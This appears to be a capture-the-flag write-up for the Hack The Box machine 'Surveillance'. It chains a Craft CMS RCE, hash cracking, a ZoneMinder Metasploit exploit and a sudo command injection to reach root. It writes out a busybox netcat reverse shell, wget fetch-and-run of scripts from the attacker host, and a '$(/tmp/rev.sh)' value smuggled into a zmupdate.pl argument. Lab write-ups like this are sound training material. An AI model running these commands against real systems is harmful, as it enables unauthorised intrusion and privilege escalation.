![Surveillance](Surveillance.png)

# Information Gathering

Scanned all TCP ports:

```bash
# save target IP as machine variable
export IP='10.10.11.245'

#initial nmap scan
nmap -Pn -sVC -v -p- --open -T4 -oN nmap/initial.nmap $IP

#nmap results
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumeration

## TCP Port 80 - HTTP

### Manual Inspection

I briefly inspected the page and when viewing the footer section, I found that the website is behind Craft CMS. When hovering over the link, it even tells me which version!

![Untitled](Untitled.png)

I then searched for “craft cms 4.4.14 vulnerability” on Google and found the [vulnerability details](https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/) posted by Qualys and I found a [PoC exploit](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) on GitHub. This vulnerability appears to give us RCE, so, let’s try and get it working and get that initial access!

---

# Exploitation

## CVE-2023-41892

CVE-2023-41892 allows attackers to execute arbitrary code remotely.

Referring to the PoC exploit, I will copy the Python code and save it as a file called `init_exploit.py`. After reading the code and running the script, I see that we must pass in an argument of the target URL.

However, when running this, I didn’t receive error output but it looks like I had a shell but no commands were executing or being displayed… so, I reviewed the source code and changed the below section

![Untitled](Untitled%201.png)

Now, let’s run the exploit and see…

![Untitled](Untitled%202.png)

---

# Privilege Escalation

## Local enumeration

After perusing around the machine as `www-data`, I found a backup .zip file in the `~/html/craft/storage/` directory and transferred it to my machine as shown below:

```bash
# on victim machine
# in directory of backup .zip file
python3 -m http.server

# on attacker machine
wget http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip

mv surveillance--2023-10-17-202801--v4.4.14.sql.zip backup.zip
```

Now, let’s unzip the zip file on our attacker machine

```bash
unzip backup.zip
```

Luckily, there was no password. I will then rename the inflated file to `backup` for simplicity sake

The file is quite long, so I searched for potentially interesting keywords such as `user` and `admin`. After searching for this, I found the below information

![Untitled](Untitled%203.png)

After receiving a hash, it’s time to attempt to crack it! My go to is Hashcat. For hash cracking, I recommend using your host OS or a dedicated machine with a graphics card. This is not necessary for HTB machines but I like to do it to be in the habit of utilizing my GPU for cracking as it’s significantly faster.

Thus, I copy the hash and save it to a file called `hashes.txt`

I then run the below command:

```powershell
# name of the executable, path to hashes file, path to wordlist file, -O for optimization
hashcat.exe hashes.txt rockyou.txt -O
```

I run this as hashcat can sometimes automatically identify the hash, if not, it will tell you which hash-mode it thinks the hash is

![Untitled](Untitled%204.png)

The final command is shown below

```powershell
.\hashcat.exe -m 1400 .\hashes.txt .\rockyou.txt -O
```

![Untitled](Untitled%205.png)

Hash has been cracked!! Also, note how fast I iterated through nearly 33% of the rockyou wordlist file in only a few milliseconds 🤯

Let’s try to login via SSH with the new creds we’ve obtained

Note: The email address of the user was shown as `admin@surveillance.htb`, however, the user `admin` does not exist on the machine after running `cat /etc/passwd|grep /bin/bash`. Thus, the user is likely `matthew`

```bash
ssh matthew@surveillance.htb
```

![Untitled](Untitled%206.png)

Now that we’re logged in as `matthew`, I will grab the `user.txt` file.

![Untitled](Untitled%207.png)

We need to escalate our privileges to root. I will transfer linpeas to speed up this process

```bash
# on attacker machine
# if you have linpeas already, skip this step
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231210-89d560ba/linpeas.sh

# run this in the directory of the linpeas.sh file
python3 -m http.server

# on victim machine
wget http://<attacker-ip>/linpeas.sh;chmod +x linpeas.sh;./linpeas.sh
```

After reading the seemingly infinite output, I came across a section that had credentials related to an application called `zoneminder`

![Untitled](Untitled%208.png)

This along with the outputs of `netstat -ano` led me to perform a local port forward to port 8080

```bash
# on attacker machine
ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb
```

Now, when navigating to `http://127.0.0.1:2222` in your browser, you’ll see the `zoneminder` login page.

![Untitled](Untitled%209.png)

I attempted to view the source to get the version of `zoneminder` but was unsuccessful. However, we know the directory it’s stored in based off the output from linpeas(`/usr/share/zoneminder/www/api/app/Config/`)

I will `cd` to this directory and search for the keyword `version` in the directory as shown below

```bash
# on victim machine
cat * | grep -i version
```

![Untitled](Untitled%2010.png)

So, zoneminder version 1.36.32, lets look for privilege escalation vulnerabilities affecting this version.

## CVE-2023-26035

CVE-2023-26035 is vulnerable to unauthenticated remote code execution via missing authorization.

I found [vulnerability details](https://nvd.nist.gov/vuln/detail/CVE-2023-26035) posted by NVD and a [PoC exploit](https://github.com/heapbytes/CVE-2023-26035) on GitHub

Unfortunately after testing multiple different payloads, I couldn’t get the PoC to spawn a reverse shell… let’s search `msfconsole` for a potential exploit

```bash
# on attacker machine
msfconsole

search zoneminder
```

![Untitled](Untitled%2011.png)

I will then input all of the commands below to configure the exploit

```bash
# on attacker machine

set srvport 2223

set srvhost 127.0.0.1

set lhost tun0

set lport 4444

set fetch_srvport 2223

set rhosts 127.0.0.1

set rport 2222

check
```

Your check results should show the following:

![Untitled](Untitled%2012.png)

Now, lets run the payload

![Untitled](Untitled%2013.png)

I will run `getuid` and find that the session is running as the `zoneminder` user.

I will run `shell` to drop into a shell as the `zoneminder` user

I will then perform more local enumeration as this user. One of the first checks I always perform is `sudo -l` and in this case, it appears `zoneminder` can run some commands as root with no password

![Untitled](Untitled%2014.png)

Note: I am not ashamed to admit, this part was the first part that really held me up… this is because the directory only has read and execute permissions, so we can’t just write a perl script and match the naming to that of the regex for the improper sudo permissions.. thus, we have to go through the zm- scripts in the `/usr/bin` directory. I couldn’t find any help in the [HTB Forums](https://forum.hackthebox.com/t/official-surveillance-discussion/304838/68) so I had to refer to a writeup

Run the below commands to get root

```bash
# on attacker machine
echo "busybox nc <attacker-ip> <listening-port> -e sh" > rev.sh

# in directory of rev.sh file
python3 -m http.server

nc -nvlp <listening-port>

# on victim machine
wget http://<attacker-ip>:8000/rev.sh /tmp/; chmod 700 /tmp/rev.sh

sudo /usr/bin/zmupdate.pl -v 1 -u '$(/tmp/rev.sh)' -p ZoneMinderPassword2023
```

With this, we are now root and can grab the root flag

![Untitled](Untitled%2015.png)

---
# Trophy


**User.txt**

![Untitled](Untitled%2016.png)

**Root.txt**

![Untitled](Untitled%2017.png)